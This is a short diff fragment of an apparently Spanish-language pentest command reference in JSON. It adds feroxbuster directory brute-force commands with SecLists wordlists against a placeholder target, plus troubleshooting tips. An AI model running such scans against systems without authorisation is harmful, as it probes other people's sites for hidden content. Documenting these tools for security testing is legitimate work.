+          "level": 1
+        },
+        {
+          "desc": "Con SecLists",
+          "cmd": "feroxbuster -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
           "level": 1
         },
         {
@@ -1501,8 +1693,8 @@
         }
       ],
       "troubleshooting": [
-        "Demasiado ruido por recursión: limita profundidad con -d 2.",
-        "No instalado: sudo apt install feroxbuster"
+        "Wordlist no encontrada: sudo apt install -y dirb wordlists",
+        "Alternativa: usa -w con una URL de wordlist: feroxbuster -u http://{target} -w https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
       ]
     },
     {
